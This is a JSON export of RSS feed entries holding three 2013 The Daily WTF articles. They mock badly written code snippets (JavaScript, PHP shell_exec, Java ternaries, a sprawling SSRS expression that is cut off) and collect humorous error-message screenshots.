{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Ternary-Over-a-New-Leaf.aspx","title":"Coded Smorgasbord: Ternary Over a New Leaf","published":{"$wrap":"$date","v":1372833000000,"h":"2013-07-03T06:30:00.000Z"},"starred":false,"read":false,"content":"<p><strong>Dimitry</strong>likes it when the bad code he finds can be sung aloud. This particular line can be sung to the tune of“<a href=\"http://en.wikipedia.org/wiki/Rule_britannia\">Rule Britannia</a>”.</p><pre style=\"margin-left: 16pt\"><span style='color:#7f0055; font-weight:bold; '>for</span>(<span style='color:#7f0055; font-weight:bold; '>var</span>html<span style='color:#7f0055; font-weight:bold; '>in</span>data[<span style='color:#2a00ff; '>\"</span><span style='color:#2a00ff; '>html</span><span style='color:#2a00ff; '>\"</span>])$(data[<span style='color:#2a00ff; '>\"</span><span style='color:#2a00ff; '>html</span><span style='color:#2a00ff; '>\"</span>][html][0]).html(data[<span style='color:#2a00ff; '>\"</span><span style='color:#2a00ff; '>html</span><span style='color:#2a00ff; '>\"</span>][html][1]);</pre><!-- \"Auld Lang Syne\" also works, but the verse is a little too long unless you pronounce the \"dollar\", \"dot\" and the \"semi-colon\" --><p><strong>Blake</strong>was surprised by this line. I guess you could say… he was<span onclick=\"cornify_add();return false;\" title=\"click me!\">shell-shocked</span><script type=\"text/javascript\" src=\"http://www.cornify.com/js/cornify.js\"></script>.<!-- YEEEEEEAAAAAAAAHHHHHH --></p><pre style=\"margin-left: 16pt\"><span style='color:#7f0055; font-weight:bold; '>if</span>($error = shell_exec(<span style='color:#2a00ff; '>\"$mysql -h'$db_host' -u'$grantor_user' -p'$grantor_pass' mysql&lt; $tmppath</span><span style='color:#2a00ff; '>2</span><span style='color:#2a00ff; '>>&</span><span style='color:#2a00ff; '>1</span><span style='color:#2a00ff; '></span><span style='color:#2a00ff; '>1</span><span style='color:#2a00ff; '>>/dev/null\"</span>)) {<span style='color:#3f7f59; '>#handle the error…</span>}</pre><p><strong>Jeremy</strong>’s<em>ex</em>-co-worker is the sort of person who would wear a belt with suspenders.</p><pre style=\"margin-left: 16pt\">initialTab = 0;<span style='color:#7f0055; font-weight:bold; '>if</span>(<span style='color:#7f0055; font-weight:bold; '>isNaN</span>(initialTab)) { initialTab = 0; }</pre><p>The ternary operator is a convenient shorthand for conditionals. When people discover it for the first time, some of them get a little carried away with it.<strong>Bernard</strong>had to give someone a little lesson on“order of operations”.</p><pre style=\"margin-left: 16pt\"><span style='color:#7f0055; font-weight:bold; '>public</span>Money getFinanceCredit() {<span style='color:#7f0055; font-weight:bold; '>return</span>(isEdited() ? ((!usePercentage()) ? editedFixedAmount :((percentageOfBasis ==<span style='color:#7f0055; font-weight:bold; '>null</span>) ? NullMoney.NULL_AMOUNT :basis.multiply(percentageOfBasis))) : NullMoney.NULL_AMOUNT);}</pre><!-- This can be sung to Pink Floyd's \"Money\", obviously. It's a gas. --><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=2HDf5OpNxMo:bqzxwTtXRQ0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/2HDf5OpNxMo\" height=\"1\" width=\"1\"/>","author":"Remy Porter","_id":{"$wrap":"$oid","v":910}}
{"k":"0000000082","o":"0000003351","v":"001"}
{"_id":911,"_uid":911,"_dt":1373729346529,"_s":"931e2953239f74fdd5eb170c5ea5e2f3"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/My-Battery-Goes-Up-to-11.aspx","title":"Error'd: My Battery Goes Up to 11","published":{"$wrap":"$date","v":1372419900000,"h":"2013-06-28T11:45:00.000Z"},"starred":false,"read":false,"content":"<p>\"With battery life this good, I'm almost afraid to see what would happen if I picked Power Saver,\" writes<strong>Scott</strong>.</p><blockquote><p><a href=\"#Pic-1\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e71/Pic-1.png\" /></a></p><p> </p></blockquote><p><strong>Gillian M.</strong>wrote, \"I only wanted some festival tickets - who knew there were so many different 'Berks' out there?\"</p><blockquote><p><a href=\"#Pic-2\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e71/Pic-2.jpg\" /></a></p><p> </p></blockquote><p>\"I wanted to order some samples on quickstep.com but was told my email adress wasn't in their system when I tried to reset my password,\" writes<strong>Ward De Langhe</strong>, \"Moments later, I received the following email.\"</p><blockquote><p><a href=\"#Pic-3\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e71/Pic-3.jpg\" /></a></p><p> </p></blockquote><p>\"I hope installing Tomcat 7 does not mean my interal organs now belong to the Apache Foundation,\" wrote<strong>Rodney</strong>.</p><blockquote><p><a href=\"#Pic-4\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e71/Pic-4.jpg\" /></a></p><p> </p></blockquote><p>\"When the fan on my laptop cranks up and starts putting out heat like a furnace, I know it's about to do something stupid,\" wrote<strong>Mark Doyle</strong>, \"I wasn't disappointed when after taking 10 minutes to launch, VS2010 presented me with this.\"</p><blockquote><p><a href=\"#Pic-5\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e71/Pic-5.png\" /></a></p><p> </p></blockquote><p>\"I started out by searching for the RCB-3J servo driver,\" writes<strong>Iago Rubio</strong>, \"but ended up with a craving for seafood.\"</p><blockquote><p><a href=\"#Pic-6\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e71/Pic-6.png\" /></a></p><p> </p></blockquote><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=g0X3PQeH8JY:S6H8v9CVlUE:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/g0X3PQeH8JY\" height=\"1\" width=\"1\"/>","author":"Mark Bowytz","_id":{"$wrap":"$oid","v":911}}
{"k":"0000000082","o":"0000033690","v":"001"}
{"_id":912,"_uid":912,"_dt":1373729346533,"_s":"97d6dbcd096b66c4d8b1358d17662aba"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Were-Going-to-Need-Another-Guru!.aspx","title":"CodeSOD: We're Going to Need Another Guru!","published":{"$wrap":"$date","v":1372329000000,"h":"2013-06-27T10:30:00.000Z"},"starred":false,"read":false,"content":"<strong>Jonathan Mooney</strong>'s office recently lost their resident SQL Server Reporting Services guru to greener pastures. As such, a general consensus began to take hold of the teams that nobody could ever hope to match his high-level abilities and that their organization as a whole was doomed.</p><p>This fear was confirmed after the first programming change arrived after the guru's departure. A relatively simple one really - allow for the addition of another parameter - \"Overview\". Unfortunately, the departed guru prided him self on his complex methods, as represented by the code below.</p><pre><span style='color:#808030; '>=</span>SWITCH<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span>IIF<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>false</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>true</span><span style='color:#808030; '>)</span><span style='color:#808030; '>,</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span>IIF<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>false</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>true</span><span style='color:#808030; '>)</span><span style='color:#808030; '>,</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>,</span>IIF<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>false</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>true</span><span style='color:#808030; '>)</span><span style='color:#808030; '>,</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span>IIF<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>false</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>true</span><span style='color:#808030; '>)</span><span style='color:#808030; '>,</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>,</span>IIF<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>false</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>true</span><span style='color:#808030; '>)</span><span style='color:#808030; '>,</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>6</span><span style='color:#808030; '>,</span>IIF<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>6</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>6</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>6</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>6</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>6</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>6</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>false</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>true</span><span style='color:#808030; '>)</span><span style='color:#808030; '>,</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>7</span><span style='color:#808030; '>,</span>IIF<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>7</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>6</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>7</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>7</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>7</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>7</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>7</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>7</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>false</span><span style='color:#808030; '>,</span><span style='color:#0f4d75; '>true</span><span style='color:#808030; '>)</span><span style='color:#808030; '>,</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>,</span>IIF<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>7</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; '>=</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>6</span><span style='color:#808030; '>,</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>=</span><span style='color:#800000; '>\"</span><span style='color:#0000e6; '>Redemptions</span><span style='color:#800000; '>\"</span>orParameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Value<span style='color:#808030; '>(</span>iif<span style='color:#808030; '>(</span>Parameters<span style='color:#808030; '>!</span>View<span style='color:#808030; '>.</span>Count<span style='color:#808030; 